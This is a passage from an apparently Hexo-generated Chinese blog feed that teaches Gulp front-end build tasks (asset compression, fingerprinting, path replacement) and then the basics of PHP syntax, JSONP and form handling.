</span>&#123;</span><br><span class="line">  <span class="comment">// 路径相对于 gulpfile，跟 node 没关系</span></span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./public/dist'</span>)</span><br><span class="line">    .pipe(clean());</span><br><span class="line">&#125;); </span><br><span class="line"><span class="comment">// 添加 idleading</span></span><br><span class="line">gulp.task(<span class="string">'transport'</span>, [<span class="string">'clean'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  gulp.src(<span class="string">'./public/!(libs)/**/*.js'</span>)</span><br><span class="line">    .pipe(transport(&#123;</span><br><span class="line">        idleading: <span class="string">'./public/dist/'</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .pipe(concat())</span><br><span class="line">    .pipe(uglify())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./public/dist'</span>))</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// css 任务</span></span><br><span class="line">gulp.task(<span class="string">'less2css'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./public/less/*.less'</span>)</span><br><span class="line">    .pipe(less())</span><br><span class="line">    .pipe(cssmin())</span><br><span class="line">    <span class="comment">// 处理 CSS 中的图片为 base64</span></span><br><span class="line">    .pipe(base64())</span><br><span class="line">    .pipe(autoprefixer())</span><br><span class="line">    <span class="comment">// 资源后缀改了，文件里的路径也需要改变，利用 gulp-rev-collector</span></span><br><span class="line">    <span class="comment">// 先改名并存储，然后再替换</span></span><br><span class="line">    .pipe(rev())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release/css'</span>))</span><br><span class="line">    .pipe(rev.manifest())</span><br><span class="line">    .pipe(rename(<span class="string">'css-mainfest.json'</span>))</span><br><span class="line">    <span class="comment">// 收集替换前后的关系</span></span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release/rev'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 图片任务</span></span><br><span class="line"><span class="comment">// 构建过程中需要保证图片路是不变的</span></span><br><span class="line"><span class="comment">// src 有第二个参数，是一个对象</span></span><br><span class="line"><span class="comment">// 在 images 下面还有目录，那么这样还有问题</span></span><br><span class="line"><span class="comment">// 在加一个*，表示有多少层目录，都给我能找到</span></span><br><span class="line">gulp.task(<span class="string">'image'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src([<span class="string">'./images/**/*'</span>, <span class="string">'./uploads/**/*'</span>], &#123;<span class="attr">base</span>: <span class="string">'./'</span>&#125;)</span><br><span class="line">    .pipe(imagemin())</span><br><span class="line">    .pipe(rev())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release'</span>))</span><br><span class="line">    .pipe(rev.manifest())</span><br><span class="line">    .pipe(rename(<span class="string">'image-mainfest.json'</span>))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release/images'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// js 资源</span></span><br><span class="line">gulp.task(<span class="string">'js'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  gulp.src(<span class="string">'./libs/*.js'</span>)</span><br><span class="line">    .pipe(uglify())</span><br><span class="line">    <span class="comment">// 合并，需要传参数，合并后的名称</span></span><br><span class="line">    .pipe(concat(<span class="string">'all.js'</span>))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release/libs'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// html 资源</span></span><br><span class="line">gulp.task(<span class="string">'html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  gulp.src(<span class="string">'./view/*.html'</span>)</span><br><span class="line">    <span class="comment">// 需要参数，去掉空间，注释，压缩 js 代码</span></span><br><span class="line">    .pipe(htmlmin(&#123;</span><br><span class="line">      collapseWhitespace:<span class="literal">true</span>,</span><br><span class="line">      removeComments:<span class="literal">true</span>,</span><br><span class="line">      minifyJs: <span class="literal">true</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release/views'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 替换任务</span></span><br><span class="line">gulp.task(<span class="string">'revCollector'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 按照哪个标准去替换 两个参数</span></span><br><span class="line">  <span class="comment">// 文件</span></span><br><span class="line">  <span class="comment">// 替换哪个文件</span></span><br><span class="line">  gulp.src([<span class="string">'./release/rev/*.json'</span>, <span class="string">'./release/*.html'</span>])</span><br><span class="line">    .pipe(revCollector())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 页面中还引入了 jQuery，想要让两个文件做一个合并，前面的 gulp-concat 插件有点问题，还需要我们手动修改路径。</span></span><br><span class="line"><span class="comment">// 压缩合并处理路径任务，md5</span></span><br><span class="line">gulp.task(<span class="string">'useref'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./index.html'</span>)</span><br><span class="line">    <span class="comment">// 找到 build 标记的内容，合并并替换</span></span><br><span class="line">    .pipe(useref())</span><br><span class="line">    <span class="comment">// 假如是以 js 结尾的，合并并压缩，那么再调用下一个插件</span></span><br><span class="line">    <span class="comment">// uglify 只能压缩 js 文件，使用 gulp-if 插件过滤 js 文件</span></span><br><span class="line">    .pipe(gulpif(<span class="string">'*.js'</span>, uglify()))</span><br><span class="line">    <span class="comment">// 静态资源改名字</span></span><br><span class="line">    .pipe(gulpif(<span class="string">'*.js'</span>, rev()))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release'</span>))</span><br><span class="line">    <span class="comment">// 做一个收集，合并前后的文件名称变化</span></span><br><span class="line">    .pipe(rev.manifest())</span><br><span class="line">    <span class="comment">// 为了避免替换</span></span><br><span class="line">    .pipe(rename(<span class="string">'js-manifest.json'</span>))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release/rev'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 其它内容</span></span><br><span class="line">gulp.task(<span class="string">'other'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  gulp.src([<span class="string">'./api/*'</span>, <span class="string">'./public/font/*'</span>], &#123;<span class="attr">base</span>: <span class="string">'./'</span>&#125;)</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 路径替换</span></span><br><span class="line">gulp.task(<span class="string">'rev'</span>, [<span class="string">'css'</span>, <span class="string">'image'</span>, <span class="string">'useref'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  gulp.src([<span class="string">'./release/rev/*.json'</span>, <span class="string">'./release/**/*.?(html|css)'</span>])</span><br><span class="line">    .pipe(revCollector())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'./release'</span>));</span><br><span class="line">&#125;);</span><br><span class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'rev'</span>, <span class="string">'other'</span>, <span class="string">'html'</span>]);</span><br></pre></td></tr></table></figure><blockquote><p>seajs 的配置文件中加 vars 键修改引入 seajs 文件的路径</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">seajs.config(&#123;</span><br><span class="line">  base: <span class="string">'./public/asserts'</span>,</span><br><span class="line">  alias: &#123;</span><br><span class="line">    <span class="string">'jquery'</span>: <span class="string">'jQuery/jquery'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  vars: &#123;</span><br><span class="line">    path: <span class="string">'dist'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>重新配置生产环境（项目上线）文件路径：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// ./public/&#123;path&#125;/scripts/index 这个路径是模块名称需要的</span></span><br><span class="line">  seajs.use(<span class="string">'./public/&#123;path&#125;/index'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bulid 的一个示例</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- build:js ./libs/all.js --&gt;</span><br><span class="line">&lt;script src=<span class="string">"./libs/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./libs/toggle.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- endbuild --&gt;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 缓存、性能优化</span></span><br><span class="line"><span class="string">`</span>&lt;link href=<span class="string">"base.css?v=1"</span>&gt;<span class="string">`后面的参数用来解决浏览器缓存</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">浏览器会将静态资源（CSS、images、js）缓存到本地浏览器中，下次请求时就读取本地资源来显示，缓存可以带来性能的提升，但是也会给前端开发者带来问题。往往这种问题是由缓存构成的。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">怎么解决呢？分析浏览器缓存机制问题。什么情况下不需要浏览器缓存？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">浏览器默认缓存按资源路径进行的缓存 ./css/base.css，因此每次开发加个参数 ./css/base.css?v=1 或者 ./css/base.css?v=20141123 加了一个时间戳；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">前端性能优化：`</span>协商缓存，雅虎 <span class="number">13</span> 条<span class="string">`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">当内容的确改变后才需要，就意味着我们需要知道内容是否改变了，利用 md5 可以处理。当更改后会形成新的值，利用这个值充当文件名称。把文件加密成 md5 串，这种方式就是指纹</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 不同 js 文件合并</span></span><br><span class="line"><span class="string">需要注释:`</span> ./libs/all.js <span class="string">`就是合并之后的名称</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line">&lt;!-- build:js ./libs/all.js --&gt;</span><br><span class="line">&lt;script src=<span class="string">'./libs/jquery.min.js'</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">'./libs/toggle.js'</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- endbuild --&gt;</span><br></pre></td></tr></table></figure><p>移除一些上线不需要的文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 并没有实际合并，而是利用 build:css 来改名称 --&gt;</span><br><span class="line">&lt;!-- build:css ./public/css/main.css --&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"./public/less/main.less"</span>&gt;</span><br><span class="line">&lt;!-- endbuild --&gt;</span><br><span class="line">&lt;!-- build:remove --&gt;</span><br><span class="line">&lt;script src=<span class="string">"./public/less/less.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- endbuild --&gt;</span><br><span class="line">&lt;!-- build:remove --&gt;</span><br><span class="line">&lt;script src=<span class="string">'./libs/less.js'</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- endbuild --&gt;</span><br></pre></td></tr></table></figure><h2 id="合并之后压缩"><a href="#合并之后压缩" class="headerlink" title="合并之后压缩"></a>合并之后压缩</h2><p><code>.pipe(gulpif(&#39;*.js&#39;, uglify()))</code></p><h2 id="gulp-构建过程总结"><a href="#gulp-构建过程总结" class="headerlink" title="gulp 构建过程总结"></a>gulp 构建过程总结</h2><ul><li>touch gulpfile.js</li><li>全局安装 gulp</li><li>本地安装 gulp</li><li>处理 css<ul><li>gulp-less</li><li>gulp-cssmin</li><li>gulp-autoprefixer</li><li>gulp-rev</li><li>rev.minifest() 改名称了</li><li>gulp-rename</li></ul></li><li>图片处理<ul><li>gulp-imagemin</li><li>gulp-rename</li></ul></li><li>改名<ul><li>gulp-useref</li><li>gulp-manifest</li><li>gulp-uglify</li><li>gulp-if</li></ul></li><li>路径替换<ul><li>gulp-rev-collector</li></ul></li><li>压缩 html<ul><li>gulp-htmlmin</li></ul></li><li>处理一些其它内容</li></ul><h2 id="监视文件变化"><a href="#监视文件变化" class="headerlink" title="监视文件变化"></a>监视文件变化</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gulp.task(<span class="string">'watch'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 可以用这个 watch 来实现实时编译的功能</span></span><br><span class="line">  gulp.watch(<span class="string">'./index.html'</span>,[<span class="string">'default'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="文件合并时需要对每一个模块娶一个名字"><a href="#文件合并时需要对每一个模块娶一个名字" class="headerlink" title="文件合并时需要对每一个模块娶一个名字"></a>文件合并时需要对每一个模块娶一个名字</h2><p>需要一个工具</p><p>seajs 在上线做合并处理的时候，并不是将所有文件合并才是最佳方式，<br>有一些公共第三方模块可以不做合并处理，利用浏览器缓存功能更会使得性能更好；</p><p>define(‘当前模块路径’, [‘依赖模块相对路径’], function() {});</p><p>要实现上述操作，需要在合并前</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;项目构建是指项目上线之前对项目源代码进行一系列处理，使其以最佳的形式运行于线上服务器。常见处理任包括以下几方面：&lt;/p&gt;
&lt;p&gt;1、模块化开发可以实现功能的复用并解决模块间的依赖关系，但带来好处的同时也使得功能代码的碎片化（若干文件）程度增加。&lt;/p&gt;
&lt;p&gt;2、使用less、sass等预处理器，可以降低CSS的维护成本，最终需要将这些预处理器编译成css文件；&lt;/p&gt;
&lt;p&gt;3、对静态资源（css、js、html、images）压缩合并可以提升网页打开速度，提高性能；&lt;/p&gt;
&lt;p&gt;以上任务完如果完全靠手动来完成是非常耗时耗力的且容易出错，实际开发通常借助构建工具来实现。&lt;/p&gt;
&lt;p&gt;所谓构建工具是指通过一系简单配置就可以帮我们实现合并、压缩、校验、预处理等一系列任务的软件工具。&lt;/p&gt;
&lt;p&gt;常见的构建工具包括：Grunt、Gulp、F.I.S（百度出品）、webpack等。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Gulp是基于 Nodejs 开发的一个构建工具，借助 gulp 插件可以实现不同的构建任务，其以简洁的配置和卓越的性能成为目前主流的构建工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;全局安装&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ npm install -g gulp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Gulp基础&quot;&gt;&lt;a href=&quot;#Gulp基础&quot; class=&quot;headerlink&quot; title=&quot;Gulp基础&quot;&gt;&lt;/a&gt;Gulp基础&lt;/h2&gt;
    
    </summary>
    
      <category term="Gulp构建工具系列" scheme="http://yoursite.com/categories/Gulp%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Gulp" scheme="http://yoursite.com/tags/Gulp/"/>
    
  </entry>
  
  <entry>
    <title>PHP-基础</title>
    <link href="http://yoursite.com/2016/02/08/PHP-%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2016/02/08/PHP-基础/</id>
    <published>2016-02-07T16:00:00.000Z</published>
    <updated>2018-06-04T02:45:38.126Z</updated>
    
    <content type="html"><![CDATA[<h2 id="php基础"><a href="#php基础" class="headerlink" title="php基础"></a>php基础</h2><p>文件以.php后缀结尾，所有程序包含在 <code>&lt;?php ** 这里是代码 ** ?&gt;</code></p><p>避免使用中文目录和中文文件名，php页面无法直接打开需要运行在服务器环境当中。</p><a id="more"></a><h2 id="配置-php-文件，访问-https-加密网站"><a href="#配置-php-文件，访问-https-加密网站" class="headerlink" title="配置 php 文件，访问 https 加密网站"></a>配置 php 文件，访问 https 加密网站</h2><p>如何找到配置文件：</p><p>在后缀名 .php 的文件中加上：</p><ul><li>phpinfo();</li><li>exit;</li></ul><p>浏览器下访问：.php 后缀的文件</p><p>找到：<code>Loaded Configuration File</code>的路径，php.ini</p><p>找到 <code>openssl</code>，把 ‘;’ 去掉就可以访问 <code>https</code></p><h2 id="简单的php程序"><a href="#简单的php程序" class="headerlink" title="简单的php程序"></a>简单的php程序</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  <span class="comment">// 用来指定编码集</span></span><br><span class="line">  header(<span class="string">'Content-Type:text/html; charset=utf-8'</span>);</span><br><span class="line">  <span class="comment">/*这是一个最简单的php程序*/</span></span><br><span class="line">  echo <span class="string">'hello world!'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>JSONP 原理：浏览器的 <code>XMLHTTPRequest</code> 有域的限制，<code>img</code> 的 <code>src</code>，<code>link</code> 的 <code>href</code> 和 <code>script</code> 的 <code>src</code> 没有域的限制，浏览器的安全机制。</p><p>在传统里没有标准的技术，利用了技术上的特性绕过了安全性的限制，就巧妙的使用 <code>script</code> ，就会得到请求资源返回的内容。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"xx.php?callback=fn"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- 相当于返回了 fn()，变向的实现了跨域 --&gt;</span><br></pre></td></tr></table></figure><p>JSONP 突破了域的限制，没有突破安全限制。不能实现 post 跨域。跨域 JSONP 是主流。</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ol><li>变量以$开头 字母/数字/下划线 不能以数字开头</li><li>大小写敏感（区分大小写）</li></ol><p>(1)、声明一个变量$a并赋值为10</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p>(2)、输出一个变量$a</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $a;</span><br></pre></td></tr></table></figure><p>(3)、声明一个变量$b并赋值为10</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p>(4)、输出一个变量$b</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $b;</span><br></pre></td></tr></table></figure><p>输出顺序是自上向下的，相当于js <code>dcoument.write()</code> 。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><strong>字符型</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="string">'hello world!'</span>;</span><br></pre></td></tr></table></figure><p><strong>整型</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$num = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p><strong>浮点型</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$float = <span class="number">10.5</span>;</span><br></pre></td></tr></table></figure><p><strong>布尔型</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$bool = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p><strong>数组</strong></p><p>JavaScript 数组定义方式 <code>var arr = [1, 2, 3]</code>。arr[0]、arr[1]、arr[1] 等；</p><blockquote><p>PHP 是这样定义数组的</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$arr = array(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);  <span class="comment">// 这种方式叫做**索引数组**</span></span><br><span class="line"><span class="comment">// echo $arr[0];</span></span><br><span class="line"><span class="comment">// echo $arr[2];</span></span><br><span class="line"><span class="comment">// 定义方式和Javascript有区别，但是访问方式是一样的</span></span><br><span class="line"><span class="comment">// var obj = &#123;name: Hiraku, age: 10&#125;</span></span><br><span class="line"><span class="comment">// PHP另一种定定数组的方式，所表达的意义和Javascript一样，</span></span><br><span class="line"><span class="comment">// 只是语法格式不一样</span></span><br><span class="line"><span class="comment">// 这种方式叫做**关联数组**</span></span><br><span class="line">$arr1 = array(<span class="string">'name'</span>=&gt;<span class="string">'Hiraku'</span>, <span class="string">'age'</span>=&gt;<span class="number">10</span>);</span><br><span class="line"><span class="comment">// echo $arr1['name'];</span></span><br></pre></td></tr></table></figure><p><strong>对象</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Javascript var obj = &#123;name: Hirkau, age: 10&#125;</span></span><br><span class="line"><span class="comment">// PHP需要先创建一个类，下面就是创建过程</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    public $name = <span class="string">'Hiraku'</span>;</span><br><span class="line">    public $age = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">$person = <span class="keyword">new</span> Person;</span><br><span class="line"><span class="comment">// PHP访问一个对象属性的语法是不一样的</span></span><br><span class="line">echo $person-&gt;name;</span><br><span class="line"><span class="comment">// obj['name']; obj.name 不行</span></span><br></pre></td></tr></table></figure><p><strong>NULL</strong></p><blockquote><p>PHP 中一种特殊的数据类型，表示空值，即表示没有为该变量设置任何值 <code>null</code> (空值)不区分大小写，<code>null</code> 和 <code>NULL</code> 是一样的。</p></blockquote><p><strong>单引号&amp;双引号区别：</strong></p><blockquote><p>单引号内部的变量不会执行双引号会执行</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$name = <span class="string">'小明'</span>;</span><br><span class="line">echo <span class="string">'name is $name'</span>; <span class="comment">//输出 name is $name</span></span><br><span class="line">echo <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">echo <span class="string">"name is $name"</span>; <span class="comment">//输出 name is 小明</span></span><br></pre></td></tr></table></figure><p>索引数组、关联数组</p><h2 id="运算符-amp-内容输出"><a href="#运算符-amp-内容输出" class="headerlink" title="运算符&amp;内容输出"></a>运算符&amp;内容输出</h2><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>基本与Javascript语法一致，<code>.</code>号表示字符串拼接符，JavaScript中为 <code>+</code> 号</p><h3 id="内容输出"><a href="#内容输出" class="headerlink" title="内容输出"></a>内容输出</h3><ul><li>echo：输出简单数据类型，如字符串、数值</li><li>print_r()：输出复杂数据类型，如数组</li><li>var_dump()：输出详细信息，如对象、数组（了解）</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数名对大小写不敏感  默认参数（了解即可）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params">$name=<span class="string">'web developer'</span></span>) </span>&#123;</span><br><span class="line">  echo $name . <span class="string">'你好!'</span>;</span><br><span class="line">&#125;</span><br><span class="line">sayHello();</span><br></pre></td></tr></table></figure><h2 id="分支，循环语句"><a href="#分支，循环语句" class="headerlink" title="分支，循环语句"></a>分支，循环语句</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 分支控制语句、循环语句 与Javascript一样</span></span><br><span class="line"><span class="comment"> * foreach 数组遍历函数，类似Javascript中的 for in</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$name = <span class="string">'Hiraku'</span>;</span><br><span class="line"><span class="keyword">if</span>($name == <span class="string">'Hiraku'</span>) &#123;</span><br><span class="line">   echo <span class="string">'我已经在'</span> . $name . <span class="string">'学习'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   echo <span class="string">'我还没有学习过编程'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$arr = array(<span class="string">'Hiraku'</span>, <span class="string">'今年'</span>, <span class="string">'10岁了'</span>);<span class="comment">// 索引数组  </span></span><br><span class="line">$length = count($arr);<span class="comment">// PHP函数，计算数组的长度</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;$length; $i++) &#123; <span class="comment">// 和Javascript是一样的</span></span><br><span class="line">  echo $arr[$i];</span><br><span class="line">&#125;</span><br><span class="line">foreach($arr <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">    echo $k . <span class="string">'~~~'</span> . $v;</span><br><span class="line">&#125;;</span><br><span class="line">$arr1 = array(<span class="string">'name'</span>=&gt;<span class="string">'Hiraku'</span>, <span class="string">'age'</span>=&gt;<span class="string">'10'</span>);<span class="comment">// 关联数组</span></span><br><span class="line">echo $arr1[<span class="number">0</span>];<span class="comment">// 验证关联数组不可以按索引下标来访问</span></span><br><span class="line">foreach($arr1 <span class="keyword">as</span> $key=&gt;$val) &#123;<span class="comment">//PHP遍历一个关联数组</span></span><br><span class="line">   echo $key . <span class="string">'~~~'</span> . $val;</span><br><span class="line">&#125;<span class="comment">// 实际开发都是用foreach来遍历数组的</span></span><br></pre></td></tr></table></figure><h2 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h2><ol><li>表单 <code>name</code> 属性的是用来提供给服务端接收所传递数据而设置的</li><li>表单 <code>action</code> 属性设置接收数据的处理程序</li><li>表单 <code>method</code> 属性设置发送数据的方式</li><li>当上传文件是需要设置 <code>enctype=&quot;multipart/form-data&quot;</code>，且只能 <code>post</code> 方式!!!!</li><li><code>$_GET</code>接收 <code>get</code> 传值</li><li><code>$_POST</code>接收 <code>post</code> 传值</li><li><code>$_FILES</code> 接收文件上传</li></ol><h2 id="文件导入-amp-amp-常用php函数"><a href="#文件导入-amp-amp-常用php函数" class="headerlink" 